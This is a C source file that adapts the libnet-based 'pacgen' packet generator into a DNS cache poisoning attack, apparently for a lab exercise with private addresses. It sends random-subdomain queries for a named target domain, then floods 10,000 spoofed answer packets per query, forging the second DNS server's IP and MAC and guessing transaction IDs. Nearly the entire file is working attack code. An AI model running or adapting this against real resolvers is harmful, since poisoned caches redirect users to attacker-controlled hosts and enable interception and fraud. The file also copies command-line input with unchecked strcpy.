/*		    GNU GENERAL PUBLIC LICENSE
		       Version 2, June 1991
 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
*/



#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>

    int c;
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
    
    char eth_file[FILENAME_MAX] = "";
    char ip_file[FILENAME_MAX] = "";
    char tcp_file[FILENAME_MAX] = "";
    char payload_file[FILENAME_MAX] = "";
    char *payload_location;
    

    int x;
    int y = 0;
    int udp_src_port = 1;       /* UDP source port */
    int udp_des_port = 1;       /* UDP dest port */
    int z;
    int i;
    int payload_filesize = 0;

    int t_src_port;		/* TCP source port */
    int t_des_port;		/* TCP dest port */
    int t_win;		/* TCP window size */
    int t_urgent;		/* TCP urgent data pointer */
    int i_id;		/* IP id */
    int i_frag;		/* IP frag */
    u_short head_type;          /* TCP or UDP */


    u_long t_ack;		/* TCP ack number */
    u_long t_seq;		/* TCP sequence number */
    u_long i_des_addr;		/* IP dest addr */
    u_long i_src_addr;		/* IP source addr */
    u_long i_dns2_saddr;    /* IP DNS2 Saddr */

    u_char i_ttos[90];		/* IP TOS string */
    u_char t_control[65];	/* TCP control string */

    u_char eth_saddr[6];	/* NULL Ethernet saddr */
    u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_proto[60];       /* Ethernet protocal */
    int eth_pktcount;        /* How many packets to send */
    int nap_time;              /* How long to sleep */

    u_char ip_proto[40];

    u_char spa[4]={0x0, 0x0, 0x0, 0x0};
    u_char tpa[4]={0x0, 0x0, 0x0, 0x0};

    u_char *device = NULL;
    u_char i_ttos_val = 0;	/* final or'd value for ip tos */
    u_char t_control_val = 0;	/* final or'd value for tcp control */
    int i_ttl;		/* IP TTL */
    u_short e_proto_val = 0;    /* final resulting value for eth_proto */
    u_short ip_proto_val = 0;   /* final resulting value for ip_proto */
	
        //Adding new data for attack on the domain.
    char domainname[] = "tnashindns.com"; // domain name attacked
    char randomname[50];		     //random hostname
    char dns2addr[] = "192.168.5.137"; // second DNS server ip.
    u_char res_eth_saddr[6]; 	             // second DNS server MAC.


int
main(int argc, char *argv[])
{
    /*
     *  Initialize the library.  Root priviledges are required.
     */

    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
            // NULL,                                    /* network interface eth0, eth1, etc. NULL is default.*/
	   "eth0",                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }
	
/*  src_ip  = 0;
    dst_ip  = 0;
    src_prt = 0;
    dst_prt = 0;
    payload = NULL;
    payload_s = 0;
*/
    while ((c = getopt (argc, argv, "p:t:i:e:")) != EOF)
    {
        switch (c)
        {
            case 'p':
                strcpy(payload_file, optarg);
                break;
            case 't':
                strcpy(tcp_file, optarg);
                break;
            case 'i':
                strcpy(ip_file, optarg);
                break;
            case 'e':
                strcpy(eth_file, optarg);
                break;
            default:
                break;
        }
    }

    if (optind != 9)
    {    
        usage();
        exit(0);
    }
    
 //Generating random hostname under legitimate domain name. Using random functions. 
    	srand((int)time(0));        //Generating seed for random value. 
    	int loop = 0;
        while (1==1) 
		{
                  int randnum = (rand()%10000000);  //generating random number 

        	  while (randnum<1000000) 
	          randnum*=10;
        	  sprintf(randomname, ".a-%d.%s", randnum,domainname); // Generating random hostname

	       
                  alterdomain();


			i_dns2_saddr = libnet_name2addr4(l, dns2addr, LIBNET_RESOLVE); //ip address of second dns server 
		        sscanf("00, 0c, 29, 7a, c5, c2", "%x, %x, %x, %x, %x, %x", &res_eth_saddr[0], &res_eth_saddr[1], &res_eth_saddr[2], &res_eth_saddr[3], &res_eth_saddr[4], &res_eth_saddr[5]); //mac address of second dns server 

        // loading payload and header files for the query packet 
        load_payload_query(); // loading query payload
        load_ethernet();
        load_tcp_udp();
        load_ip();
        convert_proto(); // tcp or udp 

        if(ip_proto_val==IPPROTO_TCP){    
            t = libnet_build_tcp(
                t_src_port,                                    /* source port */
                t_des_port,                                    /* destination port */
                t_seq,                                         /* sequence number */
                t_ack,                                         /* acknowledgement num */
                t_control_val,                                 /* control flags */
                t_win,                                         /* window size */
                0,                                             /* checksum */
                t_urgent,                                      /* urgent pointer */
                LIBNET_TCP_H + payload_filesize,               /* TCP packet size */
            payload_location,                              /* payload */
                payload_filesize,                              /* payload size */
                l,                                             /* libnet handle */
                0);                                            /* libnet id */
            head_type = LIBNET_TCP_H;
            if (t == -1)
            {
                fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
                goto bad;
            }
        }
 
        if(ip_proto_val==IPPROTO_UDP){
                t = libnet_build_udp(
                t_src_port,                                /* source port */
                t_des_port,                                /* destination port */
                LIBNET_UDP_H + payload_filesize,           /* packet length */
                0,                                         /* checksum */
                payload_location,                          /* payload */
                payload_filesize,                          /* payload size */
                l,                                         /* libnet handle */
                0);                                        /* libnet id */
            head_type = LIBNET_UDP_H;
            if (t == -1)
            {
                fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
                goto bad;
            }
        }


        t = libnet_build_ipv4(
    /*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
            LIBNET_IPV4_H + head_type + payload_filesize,          /* length */
        i_ttos_val,                                            /* TOS */
            i_id,                                                  /* IP ID */
            i_frag,                                                /* IP Frag */
            i_ttl,                                                 /* TTL */
            ip_proto_val,                                          /* protocol */
            0,                                                     /* checksum */
            i_src_addr,                                            /* source IP */
            i_des_addr,                                            /* destination IP */
            NULL,                                                  /* payload */
            0,                                                     /* payload size */
            l,                                                     /* libnet handle */
            0);                                                    /* libnet id */
        if (t == -1)
        {
            fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
            goto bad;
        }

        t = libnet_build_ethernet(
            eth_daddr,                                   /* ethernet destination */
            eth_saddr,                                   /* ethernet source */
            e_proto_val,                                 /* protocol type */
            NULL,                                        /* payload */
            0,                                           /* payload size */
            l,                                           /* libnet handle */
            0);                                          /* libnet id */
        if (t == -1)
        {
            fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
            goto bad;
        }
         /* 
         *  Write it to the wire.
         */
        c = libnet_write(l); //Query sent
        // Freeing up payload and libnet location. 
        free(payload_location);
        libnet_destroy(l);
        

	//Doing entire process again for DNS answer packet 

    for (i=0;i<10000;i++) { // 10,000 packets per query
        l = libnet_init(
        LIBNET_LINK,                             /* injection type */
        // NULL,                                    /* network interface eth0, eth1, etc. NULL is default.*/
        "eth0",                                /* network interface eth0, eth1, etc. NULL is default.*/
        errbuf);                                 /* error buffer */

        // reinit the handle for sending responses
        if (l == NULL)
        {
            fprintf(stderr, "libnet_init() failed: %s", errbuf);
            exit(EXIT_FAILURE); 
        }

        load_payload_answer();  //Loading Answer payload

	//We must now change the port addresses to spoof the second DNS server. This can be done by setting source to second DNS server and destination to first DNS server.
	// Rest of the header files will remain the same
        if(ip_proto_val==IPPROTO_UDP){
                t = libnet_build_udp(
                t_des_port,                                /* source port */
                t_src_port,                                /* destination port */
                LIBNET_UDP_H + payload_filesize,           /* packet length */
                0,                                         /* checksum */
                payload_location,                          /* payload */
                payload_filesize,                          /* payload size */
                l,                                         /* libnet handle */
                0);                                        /* libnet id */
            head_type = LIBNET_UDP_H;
            if (t == -1)
            {
                fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
                goto bad;
            }
        }

        //The ethernet addresses are changed to spoof the second DNS server.
        t = libnet_build_ipv4(
         /*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
            LIBNET_IPV4_H + head_type + payload_filesize,          /* length */
        i_ttos_val,                                            /* TOS */
            i_id,                                                  /* IP ID */
            i_frag,                                                /* IP Frag */
            i_ttl,                                                 /* TTL */
            ip_proto_val,                                          /* protocol */
            0,                                                     /* checksum */
            i_dns2_saddr,                                            /* source IP */
            i_des_addr,                                            /* destination IP */
            NULL,                                                  /* payload */
            0,                                                     /* payload size */
            l,                                                     /* libnet handle */
            0);                                                    /* libnet id */
        if (t == -1)
        {
            fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
            goto bad;
        }

        t = libnet_build_ethernet(
            eth_daddr,                                   /* ethernet destination */
            res_eth_saddr,                                   /* ethernet source */
            e_proto_val,                                 /* protocol type */
            NULL,                                        /* payload */
            0,                                           /* payload size */
            l,                                           /* libnet handle */
            0);                                          /* libnet id */
        if (t == -1)
        {
            fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
            goto bad;
        }
         /* 
         *  Write it to the wire.
         */
        c = libnet_write(l);
        printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */
        free(payload_location);
        libnet_destroy(l);

    }


        l = libnet_init(
        LIBNET_LINK,                             /* injection type */
        // NULL,                                    /* network interface eth0, eth1, etc. NULL is default.*/
        "eth0",                                /* network interface eth0, eth1, etc. NULL is default.*/
        errbuf);                                 /* error buffer */

        if (l == NULL)
        {
            fprintf(stderr, "libnet_init() failed: %s", errbuf);
            exit(EXIT_FAILURE); 
        }
        


//The following loop each time sends a random query and 10,000 answer packets. 
        loop++;
  
            if(loop == 1)
		{
                break;
                }
     

   	 }

    /* give the buf memory back */
    // clear memory 
    libnet_destroy(l);
    return 0;
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);


}

usage()
{
    fprintf(stderr, "pacgen 1.10 by Bo Cato. Protected under GPL.\nusage: pacgen -p <payload file> -t <TCP/UDP file> -i <IP file> -e <Ethernet file>\n");
}

//Loading payload query function
load_payload_query()
{
    FILE *infile;
    struct stat statbuf;
    int i = 0;
    int c = 0;
    
    int j = 0;//to Traverse through the payload 
    /* get the file size so we can figure out how much memory to allocate */
 
    stat(payload_file, &statbuf);

    unsigned int len = (unsigned)strlen(randomname); // Must add random hostname to the payload 

    payload_filesize = statbuf.st_size + len;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }

    /* open the file and read it into memory */

    infile = fopen(payload_file, "r"); /* open the payload file read only */
    
    while((c = getc(infile)) != EOF)
    {
        if (i==12) 
	  {
            for (j=0;j<len;j++) 
		{
                *(payload_location + i + j) = randomname[j]; //Adding random hostname to payload 
                }
            i+=len;
          }

        *(payload_location + i) = c;
        i++;
    }
    fclose(infile);
}

//Loading payload answer function

load_payload_answer()
{
    FILE *infile;
    struct stat statbuf;
    int i = 0;
    int c = 0;

    int j = 0; //To traverse through the payload 
    /* get the file size so we can figure out how much memory to allocate */
    char payload_file[] = "payload_answer"; // response payload


    //Transaction ID ranges from 1-65536. They are stored as 2 bytes of hex values. We use randomize functiont to generate random transaction IDs and store them in the answer payload.
    int transID[] = {rand()%256,rand()%256};

    stat(payload_file, &statbuf);

    unsigned int len = (unsigned)strlen(randomname);  //finding length of random hostname to add to the payload

    payload_filesize = statbuf.st_size + len;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }

    /* open the file and read it into memory */

    infile = fopen(payload_file, "r"); /* open the payload file read only */

	//Same as load_payload_query function
        while((c = getc(infile)) != EOF)
    {
        if (i==12) 
	{
            for (j=0;j<len;j++)
		 {
                *(payload_location + i + j) = randomname[j]; //Adding random hostname to payload
                 }
            i+=len;
        }
        *(payload_location + i) = c;
        i++;
    }
    // Adding transaction ID to first two bytes of the payload
    *payload_location = transID[0];
    *(payload_location+1) = transID[1];

    fclose(infile);
}


//Hostnames are stored in the payload with each dot replaced with the number of letters that follow it till the next dot. This is a convention by RFC. Hence to put a hostname into the payload we must
//first convert the hostname int the appropriate form.
alterdomain() 
{
    // setting the starting random string
    unsigned int len = (unsigned)strlen(randomname);
    int i=0;
    while (len>0) 
	{
        if (randomname[len-1]=='.') 
		{
            randomname[len-1]=i;
            i=0;
	        }
        else 
		{
            i++;
       		}
        len--;
    	}
}

    /* load_ethernet: load ethernet data file into the variables */
load_ethernet()
{
    FILE *infile;

    char s_read[40];
    char d_read[40];
    char p_read[60];
    char count_line[40];

    infile = fopen(eth_file, "r");

    fgets(s_read, 40, infile);         /*read the source mac*/
    fgets(d_read, 40, infile);         /*read the destination mac*/
    fgets(p_read, 60, infile);         /*read the desired protocal*/
    fgets(count_line, 40, infile);     /*read how many packets to send*/

    sscanf(s_read, "saddr,%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
    sscanf(d_read, "daddr,%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
    sscanf(p_read, "proto,%s", &eth_proto);
    sscanf(count_line, "pktcount,%d", &eth_pktcount);

    fclose(infile);
}

    /* load_tcp_udp: load TCP or UDP data file into the variables */
load_tcp_udp()
{
    FILE *infile;

    char sport_line[20] = "";
    char dport_line[20] = "";
    char seq_line[20] = "";
    char ack_line[20] = "";
    char control_line[65] = "";
    char win_line[20] = "";
    char urg_line[20] = "";

    infile = fopen(tcp_file, "r");

    fgets(sport_line, 15, infile);	/*read the source port*/
    fgets(dport_line, 15, infile); 	/*read the dest port*/
    fgets(win_line, 12, infile);	/*read the win num*/
    fgets(urg_line, 12, infile);	/*read the urg id*/
    fgets(seq_line, 13, infile);	/*read the seq num*/
    fgets(ack_line, 13, infile);	/*read the ack id*/
    fgets(control_line, 63, infile);	/*read the control flags*/

    /* parse the strings and throw the values into the variable */

    sscanf(sport_line, "sport,%d", &t_src_port);
    sscanf(sport_line, "sport,%d", &udp_src_port);
    sscanf(dport_line, "dport,%d", &t_des_port);
    sscanf(dport_line, "dport,%d", &udp_des_port);
    sscanf(win_line, "win,%d", &t_win);
    sscanf(urg_line, "urg,%d", &t_urgent);
    sscanf(seq_line, "seq,%ld", &t_seq);
    sscanf(ack_line, "ack,%ld", &t_ack);
    sscanf(control_line, "control,%[^!]", &t_control);

    fclose(infile); /*close the file*/
}

    /* load_ip: load IP data file into memory */
load_ip()
{
    FILE *infile;

    char proto_line[40] = "";
    char id_line[40] = "";
    char frag_line[40] = "";
    char ttl_line[40] = "";
    char saddr_line[40] = "";
    char daddr_line[40] = "";
    char tos_line[90] = "";
    char z_zsaddr[40] = "";
    char z_zdaddr[40] = "";
    char inter_line[15]="";

    infile = fopen(ip_file, "r");

    fgets(id_line, 11, infile);		/* this stuff should be obvious if you read the above subroutine */
    fgets(frag_line, 13, infile);	/* see RFC 791 for details */
    fgets(ttl_line, 10, infile);
    fgets(saddr_line, 24, infile);
    fgets(daddr_line, 24, infile);
    fgets(proto_line, 40, infile);
    fgets(inter_line, 15, infile);
    fgets(tos_line, 78, infile);
    
    sscanf(id_line, "id,%d", &i_id);
    sscanf(frag_line, "frag,%d", &i_frag);
    sscanf(ttl_line, "ttl,%d", &i_ttl);
    sscanf(saddr_line, "saddr,%s", &z_zsaddr);
    sscanf(daddr_line, "daddr,%s", &z_zdaddr);
    sscanf(proto_line, "proto,%s", &ip_proto);
    sscanf(inter_line, "interval,%d", &nap_time);
    sscanf(tos_line, "tos,%[^!]", &i_ttos);

    i_src_addr = libnet_name2addr4(l, z_zsaddr, LIBNET_RESOLVE);
    i_des_addr = libnet_name2addr4(l, z_zdaddr, LIBNET_RESOLVE);
    
    fclose(infile);
}

convert_proto()
{

/* Need to add more Ethernet and IP protocals to choose from */

	if(strstr(eth_proto, "arp") != NULL)
	  e_proto_val = e_proto_val | ETHERTYPE_ARP;

	if(strstr(eth_proto, "ip") != NULL)
	  e_proto_val = e_proto_val | ETHERTYPE_IP;

	if(strstr(ip_proto, "tcp") != NULL)
        ip_proto_val = ip_proto_val | IPPROTO_TCP;

	if(strstr(ip_proto, "udp") != NULL)
	  ip_proto_val = ip_proto_val | IPPROTO_UDP;
}

    /* convert_toscontrol:  or flags in strings to make u_chars */
convert_toscontrol()
{
    if(strstr(t_control, "th_urg") != NULL)
        t_control_val = t_control_val | TH_URG;

    if(strstr(t_control, "th_ack") != NULL)
        t_control_val = t_control_val | TH_ACK;

    if(strstr(t_control, "th_psh") != NULL)
        t_control_val = t_control_val | TH_PUSH;

    if(strstr(t_control, "th_rst") != NULL)
        t_control_val = t_control_val | TH_RST;

    if(strstr(t_control, "th_syn") != NULL)
        t_control_val = t_control_val | TH_SYN;

    if(strstr(t_control, "th_fin") != NULL)
        t_control_val = t_control_val | TH_FIN;

    if(strstr(i_ttos, "iptos_lowdelay") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_LOWDELAY;

    if(strstr(i_ttos, "iptos_throughput") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_THROUGHPUT;

    if(strstr(i_ttos, "iptos_reliability") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_RELIABILITY;

    if(strstr(i_ttos, "iptos_mincost") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_MINCOST;
}








/* EOF */
